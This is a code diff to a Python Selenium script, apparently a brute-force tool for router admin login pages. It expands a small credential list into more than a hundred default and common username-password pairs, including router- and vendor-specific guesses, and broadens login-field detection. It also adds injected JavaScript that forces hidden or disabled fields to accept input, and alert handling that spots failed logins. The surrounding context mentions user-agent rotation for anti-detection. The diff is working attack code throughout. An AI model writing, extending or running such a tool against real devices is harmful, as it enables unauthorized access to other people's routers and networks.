@@ -102,12 +102,147 @@ def print_banner():
 {Colors.END}
 """
 
-# Target credentials - Only 4 combinations
+# Target credentials - Extended list for better coverage
 TARGET_CREDENTIALS = [
+    # Common defaults
     ("admin", "admin"),
+    ("admin", "password"),
+    ("admin", "1234"),
+    ("admin", "12345"),
+    ("admin", "123456"),
     ("admin", "support180"),
+    ("admin", "support"),
+    ("admin", "user"),
+    ("admin", "guest"),
+    ("admin", "root"),
+    ("admin", "administrator"),
+    ("admin", "admin123"),
+    ("admin", "pass"),
+    ("admin", "login"),
+    ("admin", "default"),
+    
+    # Support credentials
     ("support", "support"),
-    ("user", "user")
+    ("support", "admin"),
+    ("support", "password"),
+    ("support", "1234"),
+    ("support", "support180"),
+    
+    # User credentials
+    ("user", "user"),
+    ("user", "admin"),
+    ("user", "password"),
+    ("user", "1234"),
+    ("user", "guest"),
+    
+    # Other common combinations
+    ("root", "root"),
+    ("root", "admin"),
+    ("root", "password"),
+    ("root", "1234"),
+    ("root", "toor"),
+    
+    ("guest", "guest"),
+    ("guest", "admin"),
+    ("guest", "password"),
+    ("guest", "1234"),
+    
+    ("administrator", "administrator"),
+    ("administrator", "admin"),
+    ("administrator", "password"),
+    ("administrator", "1234"),
+    
+    # Empty password
+    ("admin", ""),
+    ("root", ""),
+    ("administrator", ""),
+    ("support", ""),
+    ("user", ""),
+    
+    # Common passwords
+    ("admin", "123456789"),
+    ("admin", "qwerty"),
+    ("admin", "password123"),
+    ("admin", "admin123456"),
+    ("admin", "letmein"),
+    ("admin", "welcome"),
+    ("admin", "monkey"),
+    ("admin", "dragon"),
+    ("admin", "master"),
+    ("admin", "hello"),
+    ("admin", "freedom"),
+    ("admin", "whatever"),
+    ("admin", "qazwsx"),
+    ("admin", "trustno1"),
+    ("admin", "jordan"),
+    ("admin", "harley"),
+    ("admin", "ranger"),
+    ("admin", "hunter"),
+    ("admin", "buster"),
+    ("admin", "soccer"),
+    ("admin", "hockey"),
+    ("admin", "killer"),
+    ("admin", "george"),
+    ("admin", "sexy"),
+    ("admin", "andrew"),
+    ("admin", "charlie"),
+    ("admin", "superman"),
+    ("admin", "asshole"),
+    ("admin", "fuckyou"),
+    ("admin", "dallas"),
+    ("admin", "jessica"),
+    ("admin", "panties"),
+    ("admin", "pepper"),
+    ("admin", "1234"),
+    ("admin", "12345"),
+    ("admin", "123456"),
+    ("admin", "1234567"),
+    ("admin", "12345678"),
+    ("admin", "123456789"),
+    ("admin", "1234567890"),
+    
+    # Router specific
+    ("admin", "router"),
+    ("admin", "gateway"),
+    ("admin", "modem"),
+    ("admin", "wifi"),
+    ("admin", "wireless"),
+    ("admin", "network"),
+    ("admin", "internet"),
+    ("admin", "router123"),
+    ("admin", "gateway123"),
+    ("admin", "modem123"),
+    
+    # Manufacturer specific
+    ("admin", "cisco"),
+    ("admin", "netgear"),
+    ("admin", "linksys"),
+    ("admin", "dlink"),
+    ("admin", "tp-link"),
+    ("admin", "asus"),
+    ("admin", "belkin"),
+    ("admin", "zyxel"),
+    ("admin", "huawei"),
+    ("admin", "zte"),
+    ("admin", "tenda"),
+    ("admin", "mercury"),
+    ("admin", "fast"),
+    ("admin", "totolink"),
+    ("admin", "tplink"),
+    ("admin", "dlink123"),
+    ("admin", "netgear123"),
+    ("admin", "linksys123"),
+    ("admin", "cisco123"),
+    ("admin", "asus123"),
+    ("admin", "belkin123"),
+    ("admin", "zyxel123"),
+    ("admin", "huawei123"),
+    ("admin", "zte123"),
+    ("admin", "tenda123"),
+    ("admin", "mercury123"),
+    ("admin", "fast123"),
+    ("admin", "totolink123"),
+    ("admin", "tplink123"),
 ]
 
 # User-Agent rotation for anti-detection
@@ -196,44 +331,75 @@ class ChromeRouterBruteForce:
             return None
     
     def detect_login_form(self, driver):
-        """Detect login form fields on the page"""
+        """Detect login form fields on the page with better element detection"""
         try:
+            # Wait for page to load
+            time.sleep(2)
+            
             # Common field name patterns
             username_fields = [
                 'username', 'user', 'login', 'admin', 'name', 'email', 'account',
-                'userid', 'user_id', 'loginname', 'login_name', 'uname', 'u_name'
+                'userid', 'user_id', 'loginname', 'login_name', 'uname', 'u_name',
+                'usr', 'usrnm', 'un', 'u', 'loginid', 'login_id', 'lgn', 'lgnid'
             ]
             
             password_fields = [
                 'password', 'pass', 'passwd', 'pwd', 'admin', 'secret', 'key',
-                'passphrase', 'pword', 'p_word', 'loginpass', 'login_pass'
+                'passphrase', 'pword', 'p_word', 'loginpass', 'login_pass',
+                'pswd', 'psw', 'psswrd', 'psswd', 'passw0rd', 'passwrd'
             ]
             
             username_field = None
             password_field = None
             
-            # Try to find username field
+            # Try to find username field with multiple strategies
             for field_name in username_fields:
                 try:
                     field = driver.find_element(By.NAME, field_name)
-                    username_field = field
-                    break
+                    if field.is_displayed() and field.is_enabled():
+                        username_field = field
+                        break
                 except NoSuchElementException:
-                    continue
+                    try:
+                        field = driver.find_element(By.ID, field_name)
+                        if field.is_displayed() and field.is_enabled():
+                            username_field = field
+                            break
+                    except NoSuchElementException:
+                        try:
+                            field = driver.find_element(By.XPATH, f"//input[@placeholder='{field_name}']")
+                            if field.is_displayed() and field.is_enabled():
+                                username_field = field
+                                break
+                        except NoSuchElementException:
+                            continue
             
-            # Try to find password field
+            # Try to find password field with multiple strategies
             for field_name in password_fields:
                 try:
                     field = driver.find_element(By.NAME, field_name)
-                    password_field = field
-                    break
+                    if field.is_displayed() and field.is_enabled():
+                        password_field = field
+                        break
                 except NoSuchElementException:
-                    continue
+                    try:
+                        field = driver.find_element(By.ID, field_name)
+                        if field.is_displayed() and field.is_enabled():
+                            password_field = field
+                            break
+                    except NoSuchElementException:
+                        try:
+                            field = driver.find_element(By.XPATH, f"//input[@placeholder='{field_name}']")
+                            if field.is_displayed() and field.is_enabled():
+                                password_field = field
+                                break
+                        except NoSuchElementException:
+                            continue
             
-            # If not found by name, try by type
+            # If not found by name/id, try by type
             if not username_field:
                 try:
-                    username_field = driver.find_element(By.CSS_SELECTOR, 'input[type="text"], input[type="email"]')
+                    username_field = driver.find_element(By.CSS_SELECTOR, 'input[type="text"], input[type="email"], input[type="tel"], input[type="number"]')
                 except NoSuchElementException:
                     pass
             
@@ -242,6 +408,82 @@ class ChromeRouterBruteForce:
                     password_field = driver.find_element(By.CSS_SELECTOR, 'input[type="password"]')
                 except NoSuchElementException:
                     pass
+            
+            # If still not found, try JavaScript approach
+            if not username_field or not password_field:
+                try:
+                    # Use JavaScript to find and make elements interactable
+                    script = """
+                    var usernameField = null;
+                    var passwordField = null;
+                    
+                    // Find username field
+                    var inputs = document.querySelectorAll('input');
+                    for (var i = 0; i < inputs.length; i++) {
+                        var input = inputs[i];
+                        var name = (input.name || '').toLowerCase();
+                        var id = (input.id || '').toLowerCase();
+                        var type = (input.type || '').toLowerCase();
+                        
+                        if (type === 'text' || type === 'email' || type === 'tel' || type === 'number') {
+                            if (name.includes('user') || name.includes('login') || name.includes('email') || 
+                                id.includes('user') || id.includes('login') || id.includes('email')) {
+                                usernameField = input;
+                                break;
+                            }
+                        }
+                    }
+                    
+                    // Find password field
+                    for (var i = 0; i < inputs.length; i++) {
+                        var input = inputs[i];
+                        var type = (input.type || '').toLowerCase();
+                        
+                        if (type === 'password') {
+                            passwordField = input;
+                            break;
+                        }
+                    }
+                    
+                    // Make elements interactable
+                    if (usernameField) {
+                        usernameField.style.display = 'block';
+                        usernameField.style.visibility = 'visible';
+                        usernameField.removeAttribute('disabled');
+                        usernameField.removeAttribute('readonly');
+                    }
+                    
+                    if (passwordField) {
+                        passwordField.style.display = 'block';
+                        passwordField.style.visibility = 'visible';
+                        passwordField.removeAttribute('disabled');
+                        passwordField.removeAttribute('readonly');
+                    }
+                    
+                    return {
+                        username: usernameField ? 'found' : 'not found',
+                        password: passwordField ? 'found' : 'not found'
+                    };
+                    """
+                    
+                    result = driver.execute_script(script)
+                    print(f"{Colors.BLUE}[*] JavaScript form detection: {result}{Colors.END}")
+                    
+                    # Try to find elements again after JavaScript modification
+                    if not username_field:
+                        try:
+                            username_field = driver.find_element(By.CSS_SELECTOR, 'input[type="text"], input[type="email"]')
+                        except NoSuchElementException:
+                            pass
+                    
+                    if not password_field:
+                        try:
+                            password_field = driver.find_element(By.CSS_SELECTOR, 'input[type="password"]')
+                        except NoSuchElementException:
+                            pass
+                            
+                except Exception as e:
+                    print(f"{Colors.YELLOW}[!] JavaScript form detection failed: {e}{Colors.END}")
             
             return username_field, password_field
             
@@ -290,10 +532,29 @@ class ChromeRouterBruteForce:
         try:
             page_source = driver.page_source.lower()
             current_url = driver.current_url.lower()
+            page_title = driver.title.lower()
             
-            # 1. HTTP Basic Authentication
-            if 'www-authenticate' in str(driver.get_log('browser')).lower():
-                return 'http_basic'
+            # 1. HTTP Basic Authentication - Check for 401 response
+            try:
+                # Check if we get a 401 Unauthorized response
+                if 'unauthorized' in page_source or '401' in page_source:
+                    return 'http_basic'
+                
+                # Check for basic auth prompt
+                if 'authentication required' in page_source or 'enter username and password' in page_source:
+                    return 'http_basic'
+                
+                # Check if URL shows basic auth prompt
+                if '://' in url and '@' not in url and ('login' in current_url or 'auth' in current_url):
+                    # Try to access the URL and see if we get basic auth
+                    try:
+                        response = driver.execute_script("return fetch(arguments[0], {method: 'GET'}).then(r => r.status)", url)
+                        if response == 401:
+                            return 'http_basic'
+                    except:
+                        pass
+            except:
+                pass
             
             # 2. Form-based Authentication (most common)
             if '<form' in page_source and ('password' in page_source or 'passwd' in page_source):
@@ -314,6 +575,10 @@ class ChromeRouterBruteForce:
             # 6. Redirect-based Authentication
             if driver.execute_script("return window.location.href") != url:
                 return 'redirect_based'
+            
+            # 7. Check for empty page or basic auth prompt
+            if len(page_source) < 1000 and ('login' in current_url or 'auth' in current_url):
+                return 'http_basic'
             
             # Default to form-based
             return 'form_based'
@@ -337,7 +602,7 @@ class ChromeRouterBruteForce:
             return False, None
     
     def handle_form_based_auth(self, driver, username, password):
-        """Handle form-based authentication"""
+        """Handle form-based authentication with alert handling"""
         try:
             # Detect login form
             username_field, password_field = self.detect_login_form(driver)
@@ -346,24 +611,44 @@ class ChromeRouterBruteForce:
                 return False, None
             
             # Fill login form
-            username_field.clear()
-            username_field.send_keys(username)
-            time.sleep(0.5)
-            
-            password_field.clear()
-            password_field.send_keys(password)
-            time.sleep(0.5)
+            try:
+                username_field.clear()
+                username_field.send_keys(username)
+                time.sleep(0.5)
+                
+                password_field.clear()
+                password_field.send_keys(password)
+                time.sleep(0.5)
+            except Exception as e:
+                print(f"{Colors.YELLOW}[-] Error filling form fields: {e}{Colors.END}")
+                return False, None
             
             # Find and click submit button
-            submit_button = self.find_submit_button(driver)
-            if submit_button:
-                submit_button.click()
-            else:
-                # Try pressing Enter on password field
-                password_field.send_keys("\n")
+            try:
+                submit_button = self.find_submit_button(driver)
+                if submit_button:
+                    submit_button.click()
+                else:
+                    # Try pressing Enter on password field
+                    password_field.send_keys("\n")
+            except Exception as e:
+                print(f"{Colors.YELLOW}[-] Error clicking submit: {e}{Colors.END}")
+                return False, None
             
             # Wait for page to load after login
-            time.sleep(5)
+            time.sleep(3)
+            
+            # Handle alerts (login failed messages)
+            try:
+                alert = driver.switch_to.alert
+                alert_text = alert.text
+                print(f"{Colors.YELLOW}[-] Alert detected: {alert_text}{Colors.END}")
+                alert.accept()  # Accept the alert
+                time.sleep(1)
+                return False, None  # Login failed
+            except:
+                # No alert, continue
+                pass
             
             return True, driver.current_url
             
